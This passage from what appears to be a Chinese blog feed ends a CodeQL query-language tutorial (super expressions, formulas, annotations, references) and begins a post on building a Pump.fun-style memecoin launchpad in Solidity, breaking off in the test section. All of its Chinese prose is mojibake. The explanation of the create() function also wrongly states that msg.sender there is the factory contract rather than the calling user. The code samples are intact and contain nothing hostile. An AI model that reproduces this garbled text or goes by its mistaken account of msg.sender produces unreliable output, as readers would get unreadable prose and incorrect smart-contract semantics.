ä¸ä¼šå½±å“å…¬å¼æ˜¯å¦æˆç«‹ã€‚</p><h3 id="è¡¨è¾¾å¼Expressions">è¡¨è¾¾å¼Expressions</h3><p>è¡¨è¾¾å¼è®¡ç®—ä¸€ç»„å€¼å¹¶å…·æœ‰ç±»å‹ã€‚ä¾‹å¦‚ï¼Œè¡¨è¾¾å¼ <code>1 + 2</code> è®¡ç®—ç»“æœä¸ºæ•´æ•° <code>3</code> ï¼Œè¡¨è¾¾å¼ <code>&quot;QL&quot;</code> è®¡ç®—ç»“æœä¸ºå­—ç¬¦ä¸² <code>&quot;QL&quot;</code> ã€‚1 <code>1 + 2</code><a href="https://codeql.github.com/docs/ql-language-reference/types/#types"> ç±»å‹</a>ä¸º <code>int</code> ï¼Œè€Œ <code>&quot;QL&quot;</code> ç±»å‹ä¸º <code>string</code> ã€‚æœ¬å°èŠ‚åªè®²è¿°çˆ¶ç±»è¡¨è¾¾å¼ï¼Œå…¶å®ƒå¯å‚è€ƒ<sup class="footnote-ref"><a href="#fn9" id="fnref9">[9]</a></sup>ã€‚</p><h4 id="çˆ¶ç±»è¡¨è¾¾å¼-Super-expressions">çˆ¶ç±»è¡¨è¾¾å¼(Super expressions)</h4><p><code>QL</code>ä¸­çš„çˆ¶ç±»è¡¨è¾¾å¼ä¸å…¶ä»–ç¼–ç¨‹è¯­è¨€ï¼ˆä¾‹å¦‚<code>Java</code>ï¼‰ä¸­çš„çˆ¶ç±»è¡¨è¾¾å¼ç±»ä¼¼ã€‚å½“æ‚¨æƒ³è¦ä½¿ç”¨çˆ¶ç±»å‹çš„è°“è¯å®šä¹‰æ—¶ï¼Œå¯ä»¥åœ¨è°“è¯è°ƒç”¨ä¸­ä½¿ç”¨å®ƒä»¬ã€‚å®é™…ä¸Šï¼Œå½“è°“è¯ä»å…¶çˆ¶ç±»å‹ç»§æ‰¿ä¸¤ä¸ªå®šä¹‰æ—¶ï¼Œè¿™å¾ˆæœ‰ç”¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè°“è¯å¿…é¡»<a href="https://codeql.github.com/docs/ql-language-reference/types/#overriding-member-predicates">é‡å†™</a> è¿™äº›å®šä¹‰æ˜¯ä¸ºäº†é¿å…æ­§ä¹‰ã€‚ ä½†æ˜¯ï¼Œå¦‚æœä½ æƒ³ä½¿ç”¨ç‰¹å®šè¶…ç±»å‹çš„å®šä¹‰ï¼Œè€Œä¸æ˜¯ç¼–å†™æ–°çš„å®šä¹‰ï¼Œå¯ä»¥ä½¿ç”¨çˆ¶ç±»è¡¨è¾¾å¼ã€‚</p><p>åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œç±» <code>C</code> ç»§æ‰¿äº†è°“è¯çš„ä¸¤ä¸ªå®šä¹‰ <code>getANumber()</code> â€” ä¸€ä¸ªæ¥è‡ª <code>A</code> ï¼Œä¸€ä¸ªæ¥è‡ª <code>B</code> ã€‚å®ƒä¸ä¼šé‡å†™ä¸¤ä¸ªå®šä¹‰ï¼Œè€Œæ˜¯ä½¿ç”¨ <code>B</code> ä¸­çš„å®šä¹‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_">int</span> &#123;</span><br><span class="line">  A() &#123; <span class="built_in">this</span> = <span class="number">1</span> &#125;</span><br><span class="line">  <span class="type">int</span> <span class="title function_">getANumber</span><span class="params">()</span> &#123; result = <span class="number">2</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">int</span> &#123;</span><br><span class="line">  B() &#123; <span class="built_in">this</span> = <span class="number">1</span> &#125;</span><br><span class="line">  <span class="type">int</span> <span class="title function_">getANumber</span><span class="params">()</span> &#123; result = <span class="number">3</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">extends</span> <span class="title class_">A</span>, B &#123;</span><br><span class="line">  <span class="comment">// Need to define `int getANumber()`; otherwise it would be ambiguous</span></span><br><span class="line">  override <span class="type">int</span> <span class="title function_">getANumber</span><span class="params">()</span> &#123;</span><br><span class="line">    result = B.<span class="built_in">super</span>.getANumber()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from C c</span><br><span class="line">select c, c.getANumber()</span><br></pre></td></tr></table></figure><p>è¯¥æŸ¥è¯¢çš„ç»“æœä¸ºï¼š</p><p><img src="/2025/02/23/Codeql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/image-20250430190645346.png" alt="image-20250430190645346"></p><h3 id="å…¬å¼Formulas">å…¬å¼Formulas</h3><p>å…¬å¼å®šä¹‰è¡¨è¾¾å¼ä¸­ä½¿ç”¨çš„è‡ªç”±å˜é‡ä¹‹é—´çš„é€»è¾‘å…³ç³»ã€‚</p><p>æ ¹æ®èµ‹äºˆè¿™äº›<a href="https://codeql.github.com/docs/ql-language-reference/variables/#free-variables">è‡ªç”±å˜é‡</a>çš„å€¼ï¼Œå…¬å¼å¯èƒ½ä¸ºçœŸæˆ–ä¸ºå‡ã€‚å½“å…¬å¼ä¸ºçœŸæ—¶ï¼Œæˆ‘ä»¬é€šå¸¸è¯´è¯¥å…¬å¼æˆç«‹ ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœå°†å€¼ <code>9</code> èµ‹ç»™ <code>x</code> ï¼Œå…¬å¼ <code>x = 4 + 5</code> æˆç«‹ï¼Œä½†å¯¹äºå…¶ä»–èµ‹å€¼ï¼Œå…¬å¼ <code>x</code> = 4 + 5 ä¸æˆç«‹ã€‚æœ‰äº›å…¬å¼æ²¡æœ‰ä»»ä½•è‡ªç”±å˜é‡ã€‚ä¾‹å¦‚ï¼Œ <code>1 &lt; 2</code> å§‹ç»ˆæˆç«‹ï¼Œè€Œ <code>1 &gt; 2</code> æ°¸è¿œä¸ä¼šæˆç«‹ã€‚</p><p>ä¸‹é¢åªä»‹ç»ä¸ªäººè®¤ä¸ºæ¯”è¾ƒç‰¹æ®Šçš„ç‚¹ï¼Œå…¶å®ƒç‚¹è¾ƒä¸ºç®€å•ï¼Œå¯å‚è€ƒåŸæ–‡<sup class="footnote-ref"><a href="#fn10" id="fnref10">[10]</a></sup>ã€‚</p><h4 id="é¡ºåº-Order">é¡ºåº(Order)</h4><p>è¦ä½¿ç”¨è¿™äº›é¡ºåºè¿ç®—ç¬¦ä¹‹ä¸€æ¯”è¾ƒä¸¤ä¸ªè¡¨è¾¾å¼ï¼Œæ¯ä¸ªè¡¨è¾¾å¼å¿…é¡»å…·æœ‰ä¸€ä¸ªç±»å‹ï¼Œå¹¶ä¸”è¿™äº›ç±»å‹å¿…é¡»<a href="https://codeql.github.com/docs/ql-language-reference/types/#type-compatibility">å…¼å®¹</a>å¹¶ä¸” <a href="https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#ordering">å¯æ’åºçš„ </a>ã€‚</p><p>è¿™äº›ç¬¦å·ä¸ºï¼š<code>&gt;ã€&gt;=ã€&lt;ã€&lt;=</code></p><p>ä¾‹å¦‚ï¼Œå…¬å¼ <code>&quot;Ann&quot; &lt; &quot;Anne&quot;</code> å’Œ <code>5 + 6 &gt;= 11</code> å‡æˆç«‹ã€‚</p><h3 id="æ³¨è§£Annotations">æ³¨è§£Annotations</h3><p>æ³¨é‡Šæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‚¨å¯ä»¥å°†å…¶ç›´æ¥æ”¾ç½®åœ¨<code>QL</code> å®ä½“æˆ–åç§°çš„å£°æ˜ä¹‹å‰ã€‚ç±»ä¼¼äº<code>Java</code>è¯­è¨€ã€‚</p><p>ä¾‹å¦‚ï¼Œè¦å°†æ¨¡å— <code>M</code> å£°æ˜ä¸ºç§æœ‰çš„ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">module</span> M &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯·æ³¨æ„ï¼Œä¸€äº›æ³¨é‡Šä½œç”¨äºå®ä½“æœ¬èº«ï¼Œè€Œå…¶ä»–æ³¨é‡Šä½œç”¨äºå®ä½“çš„ç‰¹å®š<em>åç§°</em> ï¼š</p><ul><li><p>å¯¹<strong>å®ä½“</strong>è¿›è¡Œæ“ä½œï¼š <code>abstract</code> ã€ <code>cached</code> ã€ <code>external</code> ã€ <code>transient</code> ã€ <code>override</code> ã€ <code>pragma</code> ã€ <code>language</code> å’Œ <code>bindingset</code></p></li><li><p>å¯¹<strong>åç§°</strong>è¿›è¡Œæ“ä½œï¼š <code>deprecated</code> ã€ <code>library</code> ã€ <code>private</code> ã€ <code>final</code> å’Œ <code>query</code></p></li></ul><p>ä¾‹å¦‚ï¼Œå¦‚æœä½ ä½¿ç”¨ <code>private</code> æ³¨é‡Šä¸€ä¸ªå®ä½“ï¼Œé‚£ä¹ˆåªæœ‰è¯¥ç‰¹å®šåç§°æ˜¯ç§æœ‰çš„ã€‚ä½ ä»ç„¶å¯ä»¥ä½¿ç”¨å…¶ä»–åç§°ï¼ˆä½¿ç”¨ <a href="https://codeql.github.com/docs/ql-language-reference/aliases/#aliases">alias</a> ï¼‰è®¿é—®è¯¥å®ä½“ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœæ‚¨ä½¿ç”¨ <code>cached</code> æ³¨é‡Šä¸€ä¸ªå®ä½“ï¼Œé‚£ä¹ˆè¯¥å®ä½“æœ¬èº«å°†è¢«ç¼“å­˜ã€‚</p><p>å…·ä½“çš„ä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> M &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">foo</span><span class="params">()</span> &#123; result = <span class="number">1</span> &#125;</span><br><span class="line">  <span class="type">predicate</span> <span class="variable">bar</span> <span class="operator">=</span> foo/<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒæŸ¥è¯¢ <code>select M::foo()</code> ä¼šæŠ¥é”™ï¼Œå› ä¸ºåç§° <code>foo</code> æ˜¯ç§æœ‰çš„ã€‚æŸ¥è¯¢ <code>select M::bar()</code> æ˜¯æœ‰æ•ˆçš„ï¼ˆè¿”å›ç»“æœ <code>1</code> ï¼‰ï¼Œå› ä¸ºåç§° <code>bar</code> æ˜¯å¯è§çš„ï¼Œå¹¶ä¸”å®ƒæ˜¯è°“è¯ <code>foo</code> çš„åˆ«åã€‚</p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://codeql.github.com/docs/codeql-overview/supported-languages-and-frameworks/">https://codeql.github.com/docs/codeql-overview/supported-languages-and-frameworks/</a> â†© <a href="#fnref1" class="footnote-backref">â†©ï¸</a></p></li><li id="fn2" class="footnote-item"><p><a href="https://paper.seebug.org/1324/">https://paper.seebug.org/1324/</a> <a href="#fnref2" class="footnote-backref">â†©ï¸</a></p></li><li id="fn3" class="footnote-item"><p><a href="https://bbs.kanxue.com/article-20135.htm">https://bbs.kanxue.com/article-20135.htm</a> <a href="#fnref3" class="footnote-backref">â†©ï¸</a></p></li><li id="fn4" class="footnote-item"><p><a href="https://github.com/webraybtl/CodeQLpy">https://github.com/webraybtl/CodeQLpy</a> <a href="#fnref4" class="footnote-backref">â†©ï¸</a></p></li><li id="fn5" class="footnote-item"><p><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a> <a href="#fnref5" class="footnote-backref">â†©ï¸</a></p></li><li id="fn6" class="footnote-item"><p><a href="https://codeql.github.com/docs/ql-language-reference/predicates/">https://codeql.github.com/docs/ql-language-reference/predicates/</a> <a href="#fnref6" class="footnote-backref">â†©ï¸</a></p></li><li id="fn7" class="footnote-item"><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/">https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/codeql/2.CodeQLè¯­æ³•/</a> <a href="#fnref7" class="footnote-backref">â†©ï¸</a></p></li><li id="fn8" class="footnote-item"><p><a href="https://codeql.github.com/docs/ql-language-reference/queries/#">https://codeql.github.com/docs/ql-language-reference/queries/#</a> <a href="#fnref8" class="footnote-backref">â†©ï¸</a></p></li><li id="fn9" class="footnote-item"><p><a href="https://codeql.github.com/docs/ql-language-reference/expressions/#">https://codeql.github.com/docs/ql-language-reference/expressions/#</a> <a href="#fnref9" class="footnote-backref">â†©ï¸</a></p></li><li id="fn10" class="footnote-item"><p><a href="https://codeql.github.com/docs/ql-language-reference/formulas/#formulas">https://codeql.github.com/docs/ql-language-reference/formulas/#formulas</a> <a href="#fnref10" class="footnote-backref">â†©ï¸</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeQL </tag>
            
            <tag> QLè¯­æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åšä¸ªåƒPump.funä¸€æ ·çš„Memecoinå¯åŠ¨å°</title>
      <link href="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/"/>
      <url>/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="å®‰è£…åˆå§‹ç¯å¢ƒ">å®‰è£…åˆå§‹ç¯å¢ƒ</h2><p>å®‰è£…<code>hardhat</code>ï¼Œå¹¶é…ç½®nodeç¯å¢ƒï¼Œæˆ‘ä½¿ç”¨çš„<code>node</code>ç¯å¢ƒä¸º<code>v22.13.0</code>ã€‚</p><p>ä¸‹è½½githubé¡¹ç›®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b starter_code https://github.com/dappuniversity/fun-pump</span><br></pre></td></tr></table></figure><p>è¿›å…¥åˆ°ç›®å½•ä¸‹<code>/FUN-PUMP</code>ï¼Œä½¿ç”¨<code>npm install</code>è¿›è¡Œå®‰è£…</p><h2 id="åˆ›å»ºToken">åˆ›å»ºToken</h2><p>ä½¿ç”¨<code>ERC20.sol</code>åˆ›å»º<code>token</code>ï¼Œå‚è€ƒ<code>openzeppelin</code>ã€‚</p><p>ä½¿ç”¨åˆ°<code>Remix</code>å»ç¼–å†™<code>token</code>çš„solidityï¼Œ<code>Token.sol</code>çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.27;</span><br><span class="line"></span><br><span class="line">import &#123;ERC20&#125; from &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Token is ERC20 &#123;</span><br><span class="line">    address payable public owner;</span><br><span class="line">    address public creator;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address _creator,</span><br><span class="line">        string memory _name,</span><br><span class="line">        string memory _symbol,</span><br><span class="line">        uint256 _totalSupply</span><br><span class="line">    ) ERC20(_name, _symbol) &#123;</span><br><span class="line">        owner = payable(msg.sender);</span><br><span class="line">        creator = _creator;</span><br><span class="line"></span><br><span class="line">        _mint(msg.sender, _totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç ä¸­å˜é‡ï¼š</p><ul><li><code>_creator</code>ï¼šä»£å¸åˆ›å»ºè€…çš„åœ°å€ã€‚</li><li><code>_name</code>ï¼šä»£å¸åç§°ï¼ˆä¾‹å¦‚ â€œMy Tokenâ€ï¼‰ã€‚</li><li><code>_symbol</code>ï¼šä»£å¸ç¬¦å·ï¼ˆä¾‹å¦‚ â€œMTKâ€ï¼‰ã€‚</li><li><code>_totalSupply</code>ï¼šè¦é“¸é€ çš„ä»£å¸æ€»é‡ã€‚</li></ul><p><code>owner = payable(msg.sender);</code> çš„å«ä¹‰ï¼š</p><ul><li><code>msg.sender</code> æ˜¯è°ƒç”¨å½“å‰å‡½æ•°çš„åœ°å€ã€‚</li><li><code>payable(msg.sender)</code> å°†åœ°å€è½¬æ¢ä¸ºå¯æ”¯ä»˜ç±»å‹ï¼Œæ„å‘³ç€è¿™ä¸ªåœ°å€å¯ä»¥æ¥æ”¶ETHã€‚</li><li>åœ¨è¿™é‡Œï¼Œ<code>owner</code> è¢«è®¾ç½®ä¸ºéƒ¨ç½² <code>Token</code> åˆçº¦çš„åœ°å€ï¼ˆ<code>Factory</code> åˆçº¦ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥æ¥æ”¶ETHã€‚</li><li>ä½¿ç”¨ <code>_mint()</code> å°†å…¨éƒ¨ <code>_totalSupply</code> é“¸é€ ç»™åˆçº¦éƒ¨ç½²è€…ã€‚</li></ul><p>å…ˆä½¿ç”¨<code>Remix</code>å»éƒ¨ç½²æµ‹è¯•ï¼Œå†ä½¿ç”¨<code>hardhat</code>åœ¨æœ¬åœ°éƒ¨ç½²ã€‚</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250207190149258.png" alt="image-20250207190149258"></p><p>éƒ¨ç½²æˆåŠŸã€‚</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/Snipaste_2025-02-07_19-03-39.png" alt="Snipaste_2025-02-07_19-03-39"></p><h2 id="åˆ›å»ºå¹¶æµ‹è¯•Factory">åˆ›å»ºå¹¶æµ‹è¯•Factory</h2><p>æ•´ä¸ª<code>Meme Coin</code>å¯åŠ¨å°çš„é€»è¾‘å¦‚ä¸‹å›¾ï¼š</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250216005120396.png" alt="image-20250216005120396"></p><h3 id="å…¨å±€å˜é‡">å…¨å±€å˜é‡</h3><p>å…¨å±€å˜é‡å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">uint256 public constant TARGET = 3 ether;</span><br><span class="line">uint256 public constant TOKEN_LIMIT = 500_000 ether;</span><br><span class="line">//äº¤æ˜“è´¹è´¹ç”¨</span><br><span class="line">uint256 public immutable fee;</span><br><span class="line">//åˆçº¦çš„éƒ¨ç½²è€…</span><br><span class="line">address public owner;</span><br><span class="line">//tokenæ•°ç»„</span><br><span class="line">address[] public tokens;</span><br><span class="line">//tokenæ€»å…±çš„æ•°é‡</span><br><span class="line">uint256 public totalTokens;</span><br><span class="line"></span><br><span class="line">//å°†tokençš„åœ°å€æ˜ å°„åˆ°tokenå”®å–ä¿¡æ¯çš„ç»“æ„ä½“ä¸Š</span><br><span class="line">mapping(address =&gt; TokenSale) public tokenToSale;</span><br><span class="line">//åˆ›å»ºä¸€ä¸ªå”®å–tokençš„ç»“æ„ä½“</span><br><span class="line">struct TokenSale&#123;</span><br><span class="line">    address token;</span><br><span class="line">    string name;</span><br><span class="line">    address creator;</span><br><span class="line">    uint256 sold;</span><br><span class="line">    uint256 raised;</span><br><span class="line">    bool isOpen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­åˆ›å»ºäº†ä¸€ä¸ª<code>token</code>çš„ç»“æ„ä½“ï¼Œå…¶ä¸­</p><ul><li><code>token</code>è¡¨ç¤ºåˆ›å»ºçš„tokenåœ°å€</li><li><code>name</code>ä»£è¡¨tokençš„åç§°</li><li><code>creator</code>è¡¨ç¤ºtokençš„åˆ›é€ è€…</li><li><code>sold</code>è¡¨ç¤ºå”®å–çš„tokenæ•°é‡</li><li><code>raised</code>è¡¨ç¤ºtokenå·²ç»ç­¹èµ„äº†å¤šå°‘</li><li><code>isOpen</code>è¡¨ç¤ºtokenæ˜¯å¦å…¬å¼€å”®å–</li></ul><p>åŒæ—¶è¿˜åˆ›å»ºäº†ä¸¤ä¸ªäº‹ä»¶ï¼Œåˆ†åˆ«ä¸º<code>Created</code>å’Œ<code>Buy</code>äº‹ä»¶ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//å½“åˆ›å»ºä¸€ä¸ªtokenæ—¶ï¼Œå‘ç”Ÿäº†ä¸€ä¸ªCreatedäº‹ä»¶</span><br><span class="line">event Created(address indexed token);</span><br><span class="line">//å½“è´­ä¹°ä¸€ä¸ªtokenæ—¶ï¼Œå‘ç”Ÿä¸€ä¸ªBuyäº‹ä»¶</span><br><span class="line">event Buy(address indexed token, uint256 amount);</span><br></pre></td></tr></table></figure><p>åœ¨<code>Solidity</code>ä¸­ï¼Œ<code>event</code>ï¼ˆäº‹ä»¶ï¼‰ç”¨äºè®°å½•å’Œé€šçŸ¥åŒºå—é“¾ä¸Šå‘ç”Ÿçš„ç‰¹å®šæ“ä½œã€‚äº‹ä»¶ä¸ä¼šæ”¹å˜åˆçº¦çš„çŠ¶æ€ï¼Œä¸”å¯ä»¥è¢«å¤–éƒ¨ç³»ç»Ÿå»‰ä»·åœ°å­˜å‚¨å’Œæ£€ç´¢ï¼Œæ¯”ç›´æ¥è¿”å›å€¼æ›´èŠ‚çœ<code>gas</code>ã€‚åœ¨ä»£ç ä¸­ï¼Œ<code>indexed</code>æ˜¯<code>Solidity</code>ä¸­çš„ä¸€ä¸ªç‰¹æ®Šå…³é”®å­—ï¼Œä¸»è¦ç”¨äºä¼˜åŒ–äº‹ä»¶çš„æ£€ç´¢å’Œè¿‡æ»¤ã€‚è¢«<code>indexed</code>æ ‡è®°çš„å‚æ•°ä¼šåˆ›å»º<code>topics</code>ï¼ˆä¸»é¢˜ï¼‰ï¼Œä¾¿äºå¿«é€ŸæŸ¥è¯¢ã€‚</p><h3 id="Createå‡½æ•°-ä»£å¸åˆ›å»º">Createå‡½æ•°(ä»£å¸åˆ›å»º)</h3><h4 id="å‡½æ•°ä»£ç ">å‡½æ•°ä»£ç </h4><p><code>Solidity</code>ä»£ç è¯¦ç»†å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function create(string memory _name, string memory _symbol) external payable &#123;</span><br><span class="line">    //ç¡®ä¿åˆ›å»ºè€…çš„ä½™é¢å¤§äºfeeï¼Œå¦åˆ™æŠ¥é”™ä¸å‘ä¸‹ç»§ç»­æ‰§è¡Œã€‚</span><br><span class="line">    require(msg.value &gt;= fee, &quot;Factory: Creator fee not met&quot;);</span><br><span class="line"></span><br><span class="line">    //åˆ›å»ºä¸€ä¸ªtoken</span><br><span class="line">    Token token = new Token(msg.sender, _name, _symbol, 1000000 ether);</span><br><span class="line">    //tokensæ•°ç»„å­˜å‚¨token</span><br><span class="line">    tokens.push(address(token));</span><br><span class="line">    //tokenè®¡æ•°</span><br><span class="line">    totalTokens ++;</span><br><span class="line">    //åˆ—å‡ºç”¨äºå”®å–çš„token</span><br><span class="line">    // address token;</span><br><span class="line">    // string name;</span><br><span class="line">    // address creator;</span><br><span class="line">    // uint256 sold;</span><br><span class="line">    // uint256 raised;</span><br><span class="line">    // bool isOpen;</span><br><span class="line">    TokenSale memory sale = TokenSale(address(token),_name,msg.sender,0,0,true);</span><br><span class="line"></span><br><span class="line">    tokenToSale[address(token)] = sale;</span><br><span class="line">    //tell people it&#x27;s a live</span><br><span class="line">    emit Created(address(token));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œä¼ å…¥çš„å‚æ•°<code>_name</code>ä¸º<code>token</code>çš„åç§°ï¼Œ<code>_symbol</code>ä¸º<code>token</code>çš„ç¬¦å·ã€‚é€šè¿‡<code>require</code>åˆ¤æ–­åˆ›å»ºè€…çš„èµ„é‡‘æ˜¯å¦å¤§äº<code>fee</code>ï¼Œæ»¡è¶³æ¡ä»¶åæ‰èƒ½åˆ›å»º<code>token</code>ã€‚</p><p>å…¶æ¬¡ï¼Œåˆ›å»º<code>token</code>ï¼Œç»™Tokenå¿…è¦çš„å‚æ•°ï¼Œ<code>msg.sender</code>ä¸ºè°ƒç”¨<code>create</code>å‡½æ•°çš„åœ°å€ï¼Œ<strong>è¿™é‡Œä¸º<code>factory</code>åˆçº¦çš„åœ°å€</strong>ï¼Œå…¶ä¸ºTokençš„åˆ›å»ºè€…ï¼Œ<code>_name</code>ä¸ºTokençš„åç§°ï¼Œ<code>_symbol</code>ä¸ºTokençš„ç¬¦å·ï¼Œ<code>1000000 ether</code>ä¸ºtokençš„æ€»ä¾›åº”é‡ã€‚</p><p>ç„¶åï¼Œå°†åˆ›å»ºçš„<code>token</code>ä¿å­˜åˆ°å·²åˆ›å»ºçš„<code>token</code>æ•°ç»„ä¸­ï¼Œå¹¶è®¡æ•°åˆ›å»ºçš„<code>token</code>æ•°é‡ã€‚</p><p>å†è€…ï¼Œåˆ›å»ºä¸€ä¸ª<code>TokenSale</code>ç»“æ„ä½“ï¼Œç”¨äºè®°å½•<code>token</code>çš„å”®å–æƒ…å†µï¼Œåˆå§‹åŒ–å­˜å…¥<code>token</code>çš„åœ°å€ã€åç§°å’Œåˆ›å»ºè€…åœ°å€ï¼Œåˆå§‹<code>token</code>çš„å”®å–é‡å’Œç­¹èµ„é‡å‡ä¸º0ï¼Œå”®å–çŠ¶æ€æ˜¯æ‰“å¼€çš„ã€‚</p><p>æœ€åï¼Œä½¿ç”¨åˆ°<code>mapping</code>ï¼Œä½¿å¾—<code>token</code>çš„åœ°å€ç›´æ¥æ˜ å°„åˆ°<code>token</code>çš„å”®å–ä¿¡æ¯(<code>tokenSale</code>)ä¸Šã€‚åŒæ—¶ï¼Œæ¯åˆ›å»ºä¸€ä¸ªæ–°çš„<code>token</code>éƒ½ä¼šåˆ›å»ºä¸€ä¸ª<code>Created</code>äº‹ä»¶ã€‚</p><h4 id="åˆçº¦æµ‹è¯•">åˆçº¦æµ‹è¯•</h4><p>jsä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 